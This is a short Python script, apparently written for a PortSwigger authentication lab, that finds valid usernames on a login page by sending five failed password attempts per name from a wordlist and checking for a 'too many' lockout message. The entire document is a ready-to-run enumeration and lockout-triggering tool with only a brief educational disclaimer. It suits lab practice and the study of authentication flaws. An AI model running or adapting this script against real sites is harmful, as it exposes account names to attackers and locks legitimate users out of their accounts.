"""
Username Enumeration via Account Lockout
Target: PortSwigger Authentication Lab
Technique: Send 5 requests per username to trigger lockout message

Note: Written with AI assistance while learning.
      For educational purposes on legal platforms only.
"""

import requests

url = "https://LAB-URL.web-security-academy.net/login"
cookies = {"session": "YOUR_SESSION_COOKIE"}
usernames = open("usernames.txt").readlines()

print("[*] Starting username enumeration...")

for user in usernames:
    user = user.strip()
    for i in range(5):
        r = requests.post(url,
            data={"username": user, "password": "test"},
            cookies=cookies)
        if "too many" in r.text.lower():
            print(f"[+] Valid username found: {user}")
            break

print("Done!")
